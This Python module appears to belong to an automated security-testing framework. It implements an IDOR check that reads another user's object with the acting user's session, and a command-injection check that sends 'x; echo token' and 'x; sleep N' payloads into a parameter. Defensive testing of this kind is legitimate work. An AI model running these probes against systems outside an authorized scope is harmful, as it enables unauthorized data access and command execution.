"""Dynamic, deterministic HTTP executors.

This is a code implementation of the idor.md skill procedure (no LLM): it logs in as one
user, reads their own object as a baseline, then requests another user's object with the
same session and compares. Confirmation requires the cross-user data to actually appear
in the response, and evidence (raw request/response) is written to disk.

Why deterministic and not the LLM here: for a well-understood check like IDOR, code is
faster, cheaper and reproducible. The LLMExecutors remain for novel/ambiguous cases.
This set validates the whole pipeline end-to-end against a real HTTP target.

It is parameterized (login path, endpoints, accounts) so it works against the local test
fixture and any similarly-shaped target in scope.
"""
from __future__ import annotations

import json
from pathlib import Path
from urllib.parse import urlencode

from tools.httpx import Session, save_evidence

from .agents import SimulationExecutors


class HttpIdorExecutors:
    """
    params:
      base_url:     in-scope base, e.g. http://127.0.0.1:PORT
      login_path:   e.g. /login  (POST username/password form)
      me_path:      e.g. /me      (GET -> {"id": <own id>})
      user_path:    template with {id}, e.g. /api/user/{id}
      user:         {"username","password"} of the acting (low-priv) account
      victim_id:    an object id owned by a different user
      id_field:     response field that distinguishes owners (default "email")
    """

    def __init__(self, base_url, login_path, me_path, user_path, user, victim_id,
                 id_field="email"):
        self.base = base_url
        self.login_path = login_path
        self.me_path = me_path
        self.user_path = user_path
        self.user = user
        self.victim_id = victim_id
        self.id_field = id_field

    def _login(self):
        s = Session(self.base)
        s.post(self.login_path, data={"username": self.user["username"],
                                      "password": self.user["password"]})
        return s

    def recon(self, store, urls, objective):
        s = self._login()
        me = s.get(self.me_path)
        own_id = (me.json() or {}).get("id")
        hyp = {
            "id": "H-001",
            "endpoint": self.user_path,
            "method": "GET",
            "parameter": "id",
            "class": "IDOR",
            "confidence": "high",
            "reason": f"Authenticated as {self.user['username']} (own id={own_id}); "
                      f"object endpoint takes a client-controlled id.",
            "status": "open",
        }
        _save(store.dir / "recon" / "hypotheses.json", [hyp])
        _save(store.dir / "recon" / "surface.json",
              {"endpoints": [{"path": self.user_path, "method": "GET", "parameter": "id"}]})
        return {"requests_used": s.request_count}

    def hunt(self, store, hyp, urls):
        fid = "F-" + str(hyp["id"]).split("-", 1)[-1]
        ev_dir = store.dir / "findings" / "evidence" / fid
        s = self._login()

        me = s.get(self.me_path)
        own_id = (me.json() or {}).get("id")
        base_resp = s.get(self.user_path.format(id=own_id))     # baseline: own object
        cross_resp = s.get(self.user_path.format(id=self.victim_id))  # cross: victim object

        files = []
        files += save_evidence(ev_dir, "baseline-own", base_resp)
        files += save_evidence(ev_dir, "cross-victim", cross_resp)

        base_json = base_resp.json() or {}
        cross_json = cross_resp.json() or {}
        own_val = base_json.get(self.id_field)
        victim_val = cross_json.get(self.id_field)

        confirmed = (
            cross_resp.status == 200
            and victim_val is not None
            and victim_val != own_val            # genuinely a different owner
            and str(cross_json.get("id")) == str(self.victim_id)
        )
        if confirmed:
            status, severity = "confirmed", "high"
            proof = (f"Session of '{self.user['username']}' read object id={self.victim_id} "
                     f"belonging to another user ({self.id_field}={victim_val}).")
            fp_reason = None
        elif cross_resp.status in (401, 403, 404):
            status, severity, proof, fp_reason = "false-positive", None, None, \
                f"cross-object request returned {cross_resp.status} (access controlled)"
        else:
            status, severity, proof, fp_reason = "unconfirmed", None, None, None

        finding = {
            "id": fid, "hypothesis_id": hyp["id"], "class": "IDOR", "status": status,
            "endpoint": self.user_path.format(id=self.victim_id), "method": "GET",
            "parameter": "id", "severity": severity,
            "payload": f"GET {self.user_path.format(id=self.victim_id)} "
                       f"with {self.user['username']}'s session",
            "proof": proof,
            "evidence": {"dir": f"findings/evidence/{fid}/", "files": files},
            "false_positive_reason": fp_reason,
            "requests_used": s.request_count,
        }
        _save(store.dir / "findings" / f"{fid}.json", finding)
        return {"finding_file": str(store.dir / "findings" / f"{fid}.json"),
                "status": status, "requests_used": s.request_count}

    def report(self, store):
        return SimulationExecutors({}).report(store)


class HttpCmdiExecutors:
    """Code implementation of the cmdi.md procedure over real HTTP (no LLM).

    Strategy (matches the skill):
      1. Reflected: send a unique marker behind a separator (`; echo <marker>`) and also as
         a plain literal control. Confirm only if the marker appears for the injection but
         NOT for the literal control (i.e. it is command output, not input echoed back).
      2. Blind/time-based fallback: inject `; sleep N` and compare timing against a
         `sleep 0` control, reproduced twice.

    params:
      base_url, endpoint, param, method ("GET"|"POST"), blind_delay (seconds).
    """

    def __init__(self, base_url, endpoint, param, method="GET", blind_delay=1.0):
        self.base = base_url
        self.endpoint = endpoint
        self.param = param
        self.method = method.upper()
        self.blind_delay = blind_delay

    def _send(self, s, value):
        if self.method == "POST":
            return s.post(self.endpoint, data={self.param: value})
        url = self.endpoint + "?" + urlencode({self.param: value})
        return s.get(url)

    def recon(self, store, urls, objective):
        hyp = {"id": "H-001", "endpoint": self.endpoint, "method": self.method,
               "parameter": self.param, "class": "CMDI", "confidence": "medium",
               "reason": f"Parameter '{self.param}' may reach an OS command.",
               "status": "open"}
        _save(store.dir / "recon" / "hypotheses.json", [hyp])
        return {"requests_used": 0}

    def hunt(self, store, hyp, urls):
        import secrets
        fid = "F-" + str(hyp["id"]).split("-", 1)[-1]
        ev_dir = store.dir / "findings" / "evidence" / fid
        token = "HB" + secrets.token_hex(4)
        s = Session(self.base)
        files = []

        control = self._send(s, token)                 # literal: does the app echo input?
        inject = self._send(s, f"x; echo {token}")      # reflected injection
        files += save_evidence(ev_dir, "control-literal", control)
        files += save_evidence(ev_dir, "inject-reflected", inject)
        control_reflects = token in control.body
        inject_reflects = token in inject.body

        status = severity = payload = proof = fp_reason = None
        if inject_reflects and not control_reflects:
            status, severity = "confirmed", "high"
            payload = f"{self.param}=x; echo {token}"
            proof = f"Unique marker {token} returned as command output (absent from the literal control)."
        elif inject_reflects and control_reflects:
            status = "false-positive"
            fp_reason = "marker reflected even without a command separator (input echoed, not executed)"
        else:
            # Blind / time-based fallback, reproduced twice.
            base0 = self._send(s, "x; sleep 0")
            d1 = self._send(s, f"x; sleep {self.blind_delay}")
            d2 = self._send(s, f"x; sleep {self.blind_delay}")
            files += save_evidence(ev_dir, "timing-control-sleep0", base0)
            files += save_evidence(ev_dir, "timing-inject-sleepN", d1)
            thr = self.blind_delay * 0.6
            if (d1.elapsed - base0.elapsed) >= thr and (d2.elapsed - base0.elapsed) >= thr:
                status, severity = "confirmed", "high"
                payload = f"{self.param}=x; sleep {self.blind_delay}"
                proof = (f"Injected sleep added ~{self.blind_delay}s vs a sleep-0 control "
                         f"(control={base0.elapsed:.2f}s, injected={d1.elapsed:.2f}s/"
                         f"{d2.elapsed:.2f}s), reproduced twice.")
            else:
                status = "unconfirmed"

        finding = {"id": fid, "hypothesis_id": hyp["id"], "class": "CMDI", "status": status,
                   "endpoint": self.endpoint, "method": self.method, "parameter": self.param,
                   "severity": severity, "payload": payload, "proof": proof,
                   "evidence": {"dir": f"findings/evidence/{fid}/", "files": files},
                   "false_positive_reason": fp_reason, "requests_used": s.request_count}
        _save(store.dir / "findings" / f"{fid}.json", finding)
        return {"finding_file": str(store.dir / "findings" / f"{fid}.json"),
                "status": status, "requests_used": s.request_count}

    def report(self, store):
        return SimulationExecutors({}).report(store)


def _save(p: Path, data):
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(json.dumps(data, indent=2) + "\n")
